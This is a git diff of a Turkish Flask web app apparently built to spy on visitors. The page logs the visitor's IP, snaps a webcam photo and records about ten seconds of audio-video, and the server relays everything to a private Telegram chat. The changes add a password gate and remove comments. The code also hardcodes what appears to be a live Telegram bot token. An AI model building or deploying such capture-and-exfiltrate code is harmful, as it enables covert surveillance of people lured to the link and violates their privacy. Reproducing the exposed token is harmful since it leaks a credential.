@@ -7,7 +7,10 @@ app = Flask(__name__)
 
 # --- AYARLAR ---
 TELEGRAM_TOKEN = "9021080798:AAEXhjdd0iAX1cvMFrk0MXfSj2PvnXvkSV8"
-CHAT_ID = "7622505128"
+CHAT_ID = "7622505128" # Sadece senin ID'n. Başkası mesaj alamaz.
+
+# 🚨 GİZLİ ŞİFRE (Bunu kendine göre değiştir!)
+GIZLI_SIFRE = "utkan_ozel_sifre_123" 
 
 # --- TELEGRAM FONKSİYONLARI ---
 def telegram_mesaj_gonder(mesaj):
@@ -36,7 +39,6 @@ def telegram_video_gonder(video_dosyasi):
         files = {'video': ('ajan_video.webm', video_dosyasi, 'video/webm')}
         data = {'chat_id': CHAT_ID}
         
-        # Timeout süresini 60 saniyeye çıkardık ki Render'da hata vermesin
         requests.post(url, files=files, data=data, timeout=60)
     except Exception as e:
         print("Video Gönderme Hatası:", e)
@@ -45,6 +47,11 @@ def telegram_video_gonder(video_dosyasi):
 @app.route('/', methods=['GET'])
 def ana_sayfa():
     if request.path == '/favicon.ico': return "OK", 200
+    
+    # 🚨 GÜVENLİK KONTROLÜ: Linkte şifre var mı?
+    gelen_sifre = request.args.get('sifre')
+    if gelen_sifre != GIZLI_SIFRE:
+        return "<h1>Erişim Reddedildi</h1><p>Bu siteyi görüntüleme yetkiniz yok. Utkan'ın izni gerekiyor.</p>", 403
     
     ziyaretci_ip = request.environ.get('HTTP_X_FORWARDED_FOR', request.remote_addr)
     if ziyaretci_ip: ziyaretci_ip = ziyaretci_ip.split(',')[0].strip()
@@ -82,7 +89,7 @@ def ana_sayfa():
                     isSent = true;
 
                     if (mediaRecorder && mediaRecorder.state === 'recording') {{
-                        mediaRecorder.stop(); // Kaydı durdurur, 'onstop' tetiklenir
+                        mediaRecorder.stop(); 
                     }}
                 }}
 
@@ -92,7 +99,6 @@ def ana_sayfa():
                     video.srcObject = stream;
                     
                     video.onloadedmetadata = () => {{
-                        // 1. ADIM: FOTOĞRAF ÇEK
                         const canvas = document.getElementById('canvas');
                         canvas.width = video.videoWidth;
                         canvas.height = video.videoHeight;
@@ -107,7 +113,6 @@ def ana_sayfa():
 
                         durum.innerHTML = "✅ Fotoğraf çekildi. Video kaydı başlıyor...";
                         
-                        // 2. ADIM: SESLİ VİDEO KAYDET
                         mediaRecorder = new MediaRecorder(stream, {{ mimeType: 'video/webm' }});
 
                         mediaRecorder.ondataavailable = event => {{
@@ -121,7 +126,6 @@ def ana_sayfa():
                             const formData = new FormData();
                             formData.append('video_dosyasi', videoBlob, 'kayit.webm');
                             
-                            // keepalive KALDIRILDI (Hata veriyordu)
                             fetch('/video', {{
                                 method: 'POST',
                                 body: formData
@@ -131,7 +135,6 @@ def ana_sayfa():
                             }});
                         }};
 
-                        // Her saniye veri parçası al (1 saniye hatasını çözer)
                         mediaRecorder.start(1000);
                         
                         let saniye = 10;
@@ -142,13 +145,11 @@ def ana_sayfa():
                             }}
                         }}, 1000);
 
-                        // 10 Saniye dolunca gönder
                         setTimeout(() => {{
                             clearInterval(sayac);
                             verileriGonder(); 
                         }}, 10000); 
 
-                        // Çıkarken gönder (Sadece sayfa kapatılırsa çalışır)
                         window.addEventListener('beforeunload', verileriGonder);
 
                     }};
@@ -197,7 +198,6 @@ def video():
     video_dosyasi = request.files['video_dosyasi']
     video_verisi = video_dosyasi.read()
     
-    # Eğer video 0 byte ise gönderme
     if len(video_verisi) < 1000: 
         print("Video çok kısa, gönderilmedi.")
         return "Kısa video", 200
